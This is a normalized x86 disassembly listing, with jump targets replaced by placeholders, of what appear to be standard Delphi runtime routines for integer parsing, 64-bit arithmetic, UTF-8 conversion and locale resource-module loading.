cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_406208
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_407024
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_406970
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_403050
sub_406324
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405584
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405d64
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_4061f0
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
mov ecx [ ecx ]
push [ edi + 0x4 ]
call sub_406324
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_406208
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_407024
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_406970
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_403050
sub_406448
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_405ec8
mov edx eax
mov ecx esi
mov eax ebx
call sub_40643c
pop edx
pop esi
pop ebx
retn
sub_40646c
push ecx
xor edx edx
mov [ esp ] edx
mov edx eax
test edx edx
je r-xdata
mov ecx esp
xchg ecx eax
xchg ecx edx
call sub_405d8c
mov eax [ esp ]
pop edx
retn
sub edx 0x4
mov edx [ edx ]
sub_40649c
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_4064c0
push ebx
push esi
push edi
mov ebx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov esi edx
mov edi ecx
sar esi 0x1f
xor eax esi
xor edx esi
sub eax esi
sbb edx esi
sar edi 0x1f
xor esi edi
xor ebx edi
xor ecx edi
sub ebx edi
sbb ecx edi
jne r-xdata
sub esp 0xc
mov [ esp ] eax
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] edx
mov edi ecx
shr edx 0x1
rcr eax 0x1
ror edi 0x1
rcr ebx 0x1
bsr ecx ecx
shrd ebx edi cl
shrd eax edx cl
shr edx cl
rol edi 0x1
div ebx
mov ebx [ esp ]
mov ecx eax
imul edi eax
mul [ esp + 0x4 ]
add edx edi
sub ebx eax
mov eax ecx
mov ecx [ esp + 0x8 ]
sbb ecx edx
sbb eax 0x0
xor edx edx
add esp 0xc
cmp edx ebx
jb r-xdata
div ebx
mov edx ecx
jmp r-xdata
mov ecx eax
mov eax edx
xor edx edx
div ebx
xchg ecx eax
xor eax esi
xor edx esi
sub eax esi
sbb edx esi
pop edi
pop esi
pop ebx
retn 0x8
sub_406554
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
movzx eax [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
movzx eax [ esi + ebp - 0x1 ]
call sub_4033fc
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
movzx edi cl
sub edi 0x30
jmp r-xdata
add al 0xf9
sub al 0x6
jb r-xdata
movzx eax [ esi + ebp - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
movzx eax [ esi + ebp ]
call sub_4033fc
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
movzx edi cl
sub edi 0x37
jmp r-xdata
add al 0xe6
sub al 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
movzx edi [ esi + ebp - 0x1 ]
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
movzx edi cl
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_40649c
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
movzx ecx [ esi + ebp - 0x1 ]
mov eax ecx
add al 0xd0
sub al 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_40679c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
movzx eax [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_406794
jmp r-xdata
mov al 0x4
call sub_403050
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_403050
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_402f34
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_402f00
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_403af4
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_4060f8
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030fc
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_403af4
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_40677c
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_40679c
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_406934
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_402f1c
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_4060f8
sub_406970
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_406934
pop edx
pop eax
sub_406998
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_401374
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4069c8
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_401304
mov eax esp
mov dl 0x1
call sub_406c2c
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_406a10
push ebx
push esi
push edi
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
mov edi esi
cmp esi [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4069c8
mov edi eax
jmp r-xdata
cmp esi [ ebx + 0x8 ]
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp esi [ ebx + 0xc ]
jne r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_406a48
push ebx
push esi
mov esi eax
jmp r-xdata
movzx ebx [ esi ]
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp bl 0x5c
jne r-xdata
push esi
call sub_4012a4
mov esi eax
sub_406a68
push ebp
mov ebp esp
add esp 0xfffffdac
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_40130c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call sub_401314
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x253 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_406a48
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x253 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_406a48
mov edi eax
mov eax edi
sub eax esi
add eax ebx
inc eax
cmp eax 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x253 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_406a48
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax edi
sub eax esi
inc eax
push eax
push esi
lea eax [ ebp - 0x253 ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14e ]
push eax
lea eax [ ebp - 0x253 ]
push eax
call sub_4012dc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
call sub_4012d4
lea eax [ ebp - 0x122 ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x253 ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x253 ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x122 ]
push eax
lea eax [ ebp - 0x253 ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x122 ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_406c2c
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_401304
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_40135c
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_406d31
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_406a68
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_401364
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_40135c
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_401354
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_401364
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_40135c
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_401324
push eax
call sub_4012fc
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_406ecc
push ebx
push esi
push edi
push ebp
mov ebp eax
mov edi [ rw-data ]
test edi edi
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ ebx ]
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax edi
call sub_402f1c
jmp r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebp
jne r-xdata
mov edi esi
mov eax [ esi ]
mov [ ebx ] eax
mov edx 0x8
mov eax edi
call sub_402f1c
jmp r-xdata
sub_406f30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_406f6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_406f9c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_407000
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_406f30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407007
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_407024
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_407050
test edx edx
je sub_40700c
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_403050
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4070b8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_404704
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4070f4
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_40139c
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_407160
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
call [ rw-data ]
pop ebp
retn
push edx
call sub_407138
pop ecx
pop ebp
retn
sub_407180
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_40725c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
movzx ecx [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
movzx edx dl
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
movzx edx dl
shl ecx 0x6
or edx ecx
mov ecx edx
sub_40738c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_407438
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_405530
mov eax esi
xor edx edx
call sub_405ed4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40743f
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax esi
call sub_405ec8
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov eax esi
call sub_405ec8
push eax
mov eax esi
call sub_405eb8
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
lea edx [ ebx + 0x1 ]
pop ecx
call sub_407180
test eax eax
jle r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
call sub_405530
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_405c6c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_405584
sub_407448
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4074f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_405d28
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4074fa
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
mov [ ebp - 0xc ] esi
mov ebx [ ebp - 0xc ]
mov eax ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
xchg edx eax
